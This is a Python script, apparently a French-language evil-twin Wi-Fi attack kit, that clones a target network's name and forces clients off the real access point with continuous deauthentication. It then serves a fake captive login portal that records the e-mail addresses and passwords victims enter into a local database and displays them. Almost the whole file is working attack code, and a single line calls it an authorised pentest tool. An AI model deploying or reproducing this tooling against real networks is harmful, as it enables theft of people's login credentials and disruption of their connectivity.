#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""
EVIL-TWIN-PRO v1.0 — Rogue AP / Evil Twin pour pentests WiFi autorisés.
Usage : sudo python3 EVIL_TWIN_PRO.py   (root obligatoire)
Dépendances système : hostapd, dnsmasq, aircrack-ng, iw (installés par install.sh)
"""

import os
import re
import sys
import time
import sqlite3
import signal
import shutil
import threading
import subprocess
from datetime import datetime
from pathlib import Path

from rich.console import Console
from rich.table import Table
from rich.panel import Panel
from rich.prompt import Prompt, IntPrompt
from rich import box

# ============================================================
# SECTION 1 : CONSTANTES ET GLOBales
# ============================================================
console = Console()
WORKDIR = Path("/tmp/evil_twin_pro")
DB_FILE = WORKDIR / "credentials.db"
HOSTAPD_CONF = WORKDIR / "hostapd.conf"
DNSMASQ_CONF = WORKDIR / "dnsmasq.conf"
SCAN_CSV = WORKDIR / "scan"
PORTAL_PORT = 80          # portail sur port 80 (redirection captif)
AP_IP = "192.168.87.1"    # IP du rogue AP
AP_NET = "192.168.87.0/24"

# État global des processus lancés
procs = {}      # nom -> subprocess.Popen
mon_iface = None
ap_iface = None
running_portal = None  # thread serveur Flask

BANNER = r"""
  ███████╗██╗   ██╗██╗██╗     
  ██╔════╝╚██╗ ██╔╝██║██║     
  █████╗   ╚████╔╝ ██║██║     
  ██╔══╝    ╚██╔╝  ██║██║     
  ███████╗   ██║   ██║███████╗
  ╚══════╝   ╚═╝   ╚═╝╚══════╝
   ████████╗██╗    ██╗ ██████╗ ██████╗ 
   ╚══██╔══╝██║    ██║██╔════╝ ██╔══██╗
      ██║   ██║ █╗ ██║██║  ███╗██████╔╝
      ██║   ██║███╗██║██║   ██║██╔═══╝ 
      ██║   ╚███╔███╔╝╚██████╔╝██║     
      ╚═╝    ╚══╝╚══╝  ╚═════╝ ╚═╝     
        v1.0 — Rogue AP Pentest Kit
"""

# ============================================================
# SECTION 2 : UTILITAIRES
# ============================================================
def pause():
    """Pause d'affichage standard entre les actions."""
    console.input("\n[dim]Appuyez sur [bold]Entrée[/bold] pour continuer...[/dim]")


def run(cmd, check=False, capture=False, timeout=60):
    """Exécute une commande shell avec gestion d'erreur propre."""
    console.print(f"[dim]$ {' '.join(cmd)}[/dim]")
    try:
        r = subprocess.run(cmd, capture_output=capture, text=True, timeout=timeout)
        if check and r.returncode != 0:
            console.print(f"[red]Erreur ({r.returncode}) :[/red] {r.stderr.strip() or r.stdout.strip()}")
        return r
    except FileNotFoundError:
        console.print(f"[red]Binaire introuvable : {cmd[0]} — lance install.sh[/red]")
        sys.exit(1)
    except subprocess.TimeoutExpired:
        console.print("[yellow]Commande interrompue (timeout)[/yellow]")
        return None


def is_root():
    return os.geteuid() == 0


def check_deps():
    """Vérifie les binaires système requis."""
    missing = [b for b in ("hostapd", "dnsmasq", "airodump-ng", "aireplay-ng", "iw")
               if shutil.which(b) is None]
    if missing:
        console.print(f"[red]Dépendances manquantes : {', '.join(missing)}[/red]")
        console.print("[yellow]→ Lance ./install.sh d'abord[/yellow]")
        return False
    return True


def init_db():
    """Crée la base SQLite de capture des identifiants."""
    WORKDIR.mkdir(parents=True, exist_ok=True)
    db = sqlite3.connect(DB_FILE)
    db.execute("""CREATE TABLE IF NOT EXISTS creds (
        id INTEGER PRIMARY KEY AUTOINCREMENT,
        ts TEXT, essid TEXT, identity TEXT, password TEXT, useragent TEXT)""")
    db.commit()
    db.close()


# ============================================================
# SECTION 3 : GESTION DES INTERFACES (monitor / managed)
# ============================================================
def list_wlan_interfaces():
    """Liste les interfaces WiFi avec leur type actuel."""
    r = run(["iw", "dev"], capture=True)
    ifaces = []
    if r and r.stdout:
        cur = None
        for line in r.stdout.splitlines():
            m = re.match(r"\s*Interface\s+(\S+)", line)
            if m:
                cur = m.group(1)
            m2 = re.search(r"type\s+(\S+)", line)
            if m2 and cur:
                ifaces.append((cur, m2.group(1)))
                cur = None
    return ifaces


def enable_monitor(iface):
    """Passe une interface en mode moniteur via airmon-ng."""
    run(["airmon-ng", "check", "kill"], capture=True)   # tue NetworkManager/wpa_supplicant
    r = run(["airmon-ng", "start", iface], capture=True)
    # détecte le nom de la nouvelle interface moniteur
    for name, t in list_wlan_interfaces():
        if t == "monitor":
            return name
    console.print("[red]Impossible de créer l'interface moniteur[/red]")
    return None


def disable_monitor(mon):
    """Repasse en mode géré et relance le réseau."""
    run(["airmon-ng", "stop", mon], capture=True)
    run(["service", "NetworkManager", "restart"], capture=True)
    run(["service", "network-manager", "restart"], capture=True)


# ============================================================
# SECTION 4 : SCAN DES AP CIBLES
# ============================================================
def scan_targets(mon_iface):
    """Scan airodump-ng pendant N secondes puis parse le CSV."""
    t = IntPrompt.ask("[cyan]Durée du scan (secondes)[/cyan]", default=15)
    # nettoyage des anciens CSV
    for f in WORKDIR.glob("scan*.csv"):
        f.unlink()
    console.print(f"[yellow]Scan sur {mon_iface} ({t}s)... Ctrl+C pour arrêter plus tôt[/yellow]")
    try:
        run(["airodump-ng", "--write", str(SCAN_CSV), "--output-format", "csv",
             "-a", mon_iface], timeout=t + 5)
    except KeyboardInterrupt:
        pass
    csv_file = None
    for f in WORKDIR.glob("scan-01.csv"):
        csv_file = f
    if not csv_file:
        console.print("[red]Aucun résultat de scan[/red]")
        return []
    aps = []
    lines = csv_file.read_text(errors="ignore").splitlines()
    for line in lines:
        if not line.strip() or line.startswith("BSSID") is False and "," not in line.split(",")[0:1]:
            pass
        parts = line.split(",")
        if len(parts) < 14:
            continue
        bssid = parts[0].strip()
        if not re.match(r"([0-9A-Fa-f]{2}:){5}[0-9A-Fa-f]{2}", bssid):
            continue
        try:
            pwr = int(parts[8].strip())
        except ValueError:
            continue
        if pwr == -1:      # ligne AP sans puissance valide
            continue
        chan = parts[3].strip()
        essid = parts[13].strip()
        if essid:
            aps.append({"bssid": bssid, "chan": chan, "pwr": pwr, "essid": essid,
                        "enc": parts[5].strip()})
    # tri par puissance décroissante (plus proche d'abord)
    return sorted(aps, key=lambda a: a["pwr"], reverse=True)


def show_targets(aps):
    """Affiche les AP détectés dans un tableau rich."""
    table = Table(box=box.SIMPLE_HEAVY, title="AP détectés")
    table.add_column("#", style="cyan")
    table.add_column("ESSID", style="bold")
    table.add_column("BSSID")
    table.add_column("CH")
    table.add_column("PWR")
    table.add_column("Enc")
    for i, ap in enumerate(aps, 1):
        table.add_row(str(i), ap["essid"], ap["bssid"], ap["chan"], str(ap["pwr"]), ap["enc"])
    console.print(table)


# ============================================================
# SECTION 5 : LANCEMENT DU ROGUE AP (hostapd + dnsmasq)
# ============================================================
def write_hostapd_conf(essid, chan):
    """Génère hostapd.conf clonant l'ESSID cible."""
    HOSTAPD_CONF.write_text(f"""# Rogue AP généré par EVIL-TWIN-PRO
interface={ap_iface}
driver=nl80211
ssid={essid}
channel={chan}
hw_mode=g
ieee80211n=1
wmm_enabled=1
auth_algs=1        # open (pas de clé : c'est le portail qui capture)
ignore_broadcast_ssid=0
""")


def write_dnsmasq_conf():
    """dnsmasq : DHCP + DNS captif (tout résout vers le portail)."""
    DNSMASQ_CONF.write_text(f"""interface={ap_iface}
bind-interfaces
dhcp-range=192.168.87.10,192.168.87.200,12h
address=/#/{AP_IP}
server=8.8.8.8
no-resolv
dhcp-option=3,{AP_IP}
dhcp-option=6,{AP_IP}
""")


def setup_network():
    """Configure l'IP du AP et les règles iptables (NAT optionnel)."""
    run(["ip", "addr", "flush", "dev", ap_iface])
    run(["ip", "addr", "add", f"{AP_IP}/24", "dev", ap_iface], check=True)
    run(["ip", "link", "set", ap_iface, "up"], check=True)
    if want_internet.get("v"):
        # NAT vers l'interface connectée à Internet
        wan = find_wan_iface()
        if wan:
            run(["sysctl", "-w", "net.ipv4.ip_forward=1"])
            run(["iptables", "-t", "nat", "-A", "POSTROUTING", "-o", wan,
                 "-j", "MASQUERADE"])
            run(["iptables", "-A", "FORWARD", "-i", ap_iface, "-o", wan,
                 "-j", "ACCEPT"])
            run(["iptables", "-A", "FORWARD", "-i", wan, "-o", ap_iface,
                 "-m", "state", "--state", "RELATED,ESTABLISHED", "-j", "ACCEPT"])


def find_wan_iface():
    """Détecte l'interface sortante (défaut route)."""
    r = run(["ip", "route", "show", "default"], capture=True)
    if r and r.stdout:
        m = re.search(r"dev\s+(\S+)", r.stdout)
        if m:
            return m.group(1)
    return None


def start_hostapd():
    """Démarre hostapd (broadcast du SSID cloné)."""
    p = subprocess.Popen(["hostapd", str(HOSTAPD_CONF)],
                         stdout=subprocess.DEVNULL, stderr=subprocess.PIPE)
    time.sleep(3)
    if p.poll() is not None:
        err = p.stderr.read().decode(errors="ignore")
        console.print(f"[red]hostapd a échoué :[/red]\n{err}")
        return None
    procs["hostapd"] = p
    console.print("[green]hostapd actif — SSID broadcast en cours[/green]")
    return p


def start_dnsmasq():
    """Démarre dnsmasq avec la config captive."""
    p = subprocess.Popen(["dnsmasq", "--conf-file=" + str(DNSMASQ_CONF),
                          "--no-daemon", "--log-facility=" + str(WORKDIR / "dnsmasq.log")],
                         stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
    procs["dnsmasq"] = p
    time.sleep(1)
    console.print("[green]dnsmasq actif — DNS captif + DHCP[/green]")
    return p


# ============================================================
# SECTION 6 : DÉAUTHENTIFICATION
# ============================================================
def deauth_loop(mon_iface, bssid, interval):
    """Boucle de déauth aireplay-ng sur les clients du vrai AP."""
    cmd = ["aireplay-ng", "--deauth", "0", "-a", bssid, mon_iface]
    p = subprocess.Popen(cmd, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
    procs["deauth"] = p
    console.print(f"[red]Déauth continu sur {bssid} (Ctrl+C du menu pour stopper)[/red]")


def stop_deauth():
    if "deauth" in procs:
        procs["deauth"].terminate()
        del procs["deauth"]
        console.print("[yellow]Déauth arrêté[/yellow]")


# ============================================================
# SECTION 7 : PORTAIL CAPTIF (Flask, thread, sans import global lourd)
# ============================================================
PORTAL_HTML = """<!doctype html><html><head><meta charset="utf-8">
<meta name="viewport" content="width=device-width,initial-scale=1">
<title>Connexion requise</title>
<style>
body{font-family:sans-serif;background:#f2f4f7;display:flex;justify-content:center;
align-items:center;height:100vh;margin:0}
.card{background:#fff;padding:2rem;border-radius:12px;box-shadow:0 2px 12px rgba(0,0,0,.15);
width:320px;text-align:center}
input{width:100%;padding:10px;margin:6px 0;border:1px solid #ccc;border-radius:8px;
box-sizing:border-box}
button{width:100%;padding:10px;background:#0a6cff;color:#fff;border:0;border-radius:8px;
font-size:1rem;cursor:pointer}
.err{color:#c00;font-size:.85rem}
</style></head><body><div class="card">
<h2>Connexion Wi-Fi</h2><p>Authentifiez-vous pour accéder à Internet.</p>
<form method="POST" action="/check">
<input name="identity" placeholder="E-mail / identifiant" required>
<input name="password" type="password" placeholder="Mot de passe" required>
<button>Se connecter</button></form>
{% if err %}<p class="err">Identifiants incorrects. Réessayez.</p>{% endif %}
</div></body></html>"""

LOADING_HTML = """<!doctype html><html><head><meta charset="utf-8">
<meta http-equiv="refresh" content="3;url=/">
<title>Connexion...</title></head>
<body style="font-family:sans-serif;text-align:center;padding-top:20vh">
<h2>Vérification en cours...</h2></body></html>"""


def start_portal(essid):
    """Lance le portail captif Flask dans un thread (capture → SQLite)."""
    global running_portal
    from flask import Flask, request, render_template_string, redirect
    app = Flask(__name__)

    @app.route("/")
    def index():
        return render_template_string(PORTAL_HTML, essid=essid, err=False)

    @app.route("/check", methods=["POST"])
    def check():
        identity = request.form.get("identity", "")
        password = request.form.get("password", "")
        ua = request.headers.get("User-Agent", "")
        # capture en base
        db = sqlite3.connect(DB_FILE)
        db.execute("INSERT INTO creds(ts,essid,identity,password,useragent) VALUES(?,?,?,?,?)",
                   (datetime.now().isoformat(), essid, identity, password, ua))
        db.commit()
        db.close()
        console.print(f"[bold red]CAPTURE[/bold red] essid={essid} identifiant={identity} mot_de_passe={password}")
        return LOADING_HTML

    # toute autre URL -> portail (redirection captif)
    @app.route("/<path:_>")
    def catch_all(_):
        return redirect("/")

    running_portal = threading.Thread(
        target=app.run, kwargs={"host": "0.0.0.0", "port": PORTAL_PORT},
        daemon=True)
    running_portal.start()
    console.print(f"[green]Portail captif lancé sur le port {PORTAL_PORT}[/green]")


# ============================================================
# SECTION 8 : RAPPORTS
# ============================================================
def show_creds():
    """Affiche les identifiants capturés."""
    if not DB_FILE.exists():
        console.print("[yellow]Aucune capture pour l'instant[/yellow]")
        return
    db = sqlite3.connect(DB_FILE)
    rows = db.execute("SELECT ts,essid,identity,password,useragent FROM creds ORDER BY id").fetchall()
    db.close()
    if not rows:
        console.print("[yellow]Base vide — aucune capture[/yellow]")
        return
    t = Table(box=box.SIMPLE_HEAVY, title="Identifiants capturés")
    for c in ("Date", "ESSID", "Identifiant", "Mot de passe"):
        t.add_column(c)
    for ts, essid, ident, pwd, _ in rows:
        t.add_row(ts[:19], essid, ident, pwd)
    console.print(t)
    # export texte
    out = WORKDIR / "creds_export.txt"
    out.write_text("\n".join(f"{ts} | {e} | {i} | {p}" for ts, e, i, p, _ in rows))
    console.print(f"[cyan]Export :[/cyan] {out}")


# ============================================================
# SECTION 9 : NETTOYAGE
# ============================================================
def cleanup(signum=None, frame=None):
    """Arrêt propre : processes, iptables, réseau."""
    console.print("\n[yellow]Nettoyage en cours...[/yellow]")
    stop_deauth()
    for name, p in list(procs.items()):
        p.terminate()
        try:
            p.wait(timeout=5)
        except subprocess.TimeoutExpired:
            p.kill()
        console.print(f"[dim]{name} arrêté[/dim]")
    # purge iptables
    run(["iptables", "-t", "nat", "-F"], capture=True)
    run(["iptables", "-F"], capture=True)
    if mon_iface:
        disable_monitor(mon_iface)
    console.print("[green]Terminé proprement.[/green]")
    sys.exit(0)


signal.signal(signal.SIGINT, cleanup)
signal.signal(signal.SIGTERM, cleanup)


# ============================================================
# SECTION 10 : FLUX PRINCIPAL D'ATTAQUE
# ============================================================
want_internet = {"v": False}   # NAT activé ou non


def attack_flow():
    """Chaîne complète : interface -> scan -> clone -> déauth -> portail."""
    global mon_iface, ap_iface

    ifaces = list_wlan_interfaces()
    if not ifaces:
        console.print("[red]Aucune interface WiFi détectée[/red]")
        return
    console.print("[cyan]Interfaces disponibles :[/cyan]")
    for name, t in ifaces:
        console.print(f"  • {name}  [{t}]")
    ap_iface = Prompt.ask("Interface à utiliser pour le rogue AP",
                          choices=[i for i, _ in ifaces])
    if ap_iface not in [i for i, _ in ifaces]:
        console.print("[red]Interface invalide[/red]")
        return

    want_internet["v"] = Confirm_yes("Fournir Internet via le rogue AP (NAT) ?")

    console.print(f"[yellow]Passage de {ap_iface} en mode moniteur...[/yellow]")
    mon_iface = enable_monitor(ap_iface)
    if not mon_iface:
        return
    console.print(f"[green]Moniteur : {mon_iface}[/green]")

    aps = scan_targets(mon_iface)
    if not aps:
        console.print("[red]Aucun AP détecté[/red]")
        return
    show_targets(aps)
    idx = IntPrompt.ask("Numéro de la cible", default=1, choices=[str(i) for i in range(1, len(aps) + 1)])
    target = aps[idx - 1]

    # demi-temps : recréer l'iface AP depuis le moniteur
    run(["iw", "dev", mon_iface, "interface", "add", ap_iface + "ap", "type", "managed"], capture=True)
    ap_iface = ap_iface + "ap"
    console.print(f"[cyan]Interface AP créée : {ap_iface}[/cyan]")

    init_db()
    write_hostapd_conf(target["essid"], target["chan"])
    write_dnsmasq_conf()
    setup_network()

    if not start_hostapd():
        return
    start_dnsmasq()
    start_portal(target["essid"])

    if Confirm_yes("Lancer le déauth sur le vrai AP maintenant ?"):
        deauth_loop(mon_iface, target["bssid"], 0)

    console.print(Panel(
        f"[bold green]Attaque active[/bold green]\n"
        f"SSID cloné : [bold]{target['essid']}[/bold]  canal {target['chan']}\n"
        f"Portail    : http://{AP_IP}/\n"
        f"Captures   : {DB_FILE}",
        title="En attente de victimes", border_style="green"))
    console.input("[dim]Appuyez sur Entrée pour revenir au menu (l'attaque continue)...[/dim]")


def Confirm_yes(text):
    return Prompt.ask(text, choices=["o", "n"], default="o").lower() == "o"


# ============================================================
# SECTION 11 : MENU TUI
# ============================================================
def menu():
    console.print(Panel(BANNER, border_style="cyan"))
    if not is_root():
        console.print("[red]Root obligatoire : sudo python3 EVIL_TWIN_PRO.py[/red]")
        sys.exit(1)
    if not check_deps():
        sys.exit(1)
    init_db()

    while True:
        console.print()
        console.print("[bold cyan]═══ EVIL-TWIN-PRO — MENU ═══[/bold cyan]")
        console.print(" [yellow][1][/yellow] Lancer une attaque Evil Twin complète")
        console.print(" [yellow][2][/yellow] Voir / exporter les identifiants capturés")
        console.print(" [yellow][3][/yellow] Scanner les AP (moniteur requis)")
        console.print(" [yellow][4][/yellow] Arrêter / redémarrer le déauth")
        console.print(" [yellow][5][/yellow] Etat des processus")
        console.print(" [red][6][/red] Nettoyage complet et sortie")
        console.print(" [yellow][0][/yellow] Quitter")
        choice = Prompt.ask("Choix", default="0")

        if choice == "1":
            if mon_iface is None:
                attack_flow()
            else:
                console.print("[yellow]Attaque déjà en cours — option 6 pour tout arrêter[/yellow]")
                pause()
        elif choice == "2":
            show_creds()
            pause()
        elif choice == "3":
            if mon_iface is None:
                console.print("[yellow]Pas de moniteur actif — lance d'abord l'option 1[/yellow]")
            else:
                show_targets(scan_targets(mon_iface))
            pause()
        elif choice == "4":
            if "deauth" in procs:
                stop_deauth()
            else:
                console.print("[yellow]Aucun déauth actif[/yellow]")
            pause()
        elif choice == "5":
            t = Table(box=box.SIMPLE)
            t.add_column("Processus"); t.add_column("PID"); t.add_column("Vivant")
            for name, p in procs.items():
                t.add_row(name, str(p.pid), "OUI" if p.poll() is None else "non")
            console.print(t if procs else "[yellow]Aucun processus lancé[/yellow]")
            pause()
        elif choice == "6":
            cleanup()
        elif choice == "0":
            if procs:
                cleanup()
            sys.exit(0)


if __name__ == "__main__":
    try:
        menu()
    except KeyboardInterrupt:
        cleanup()
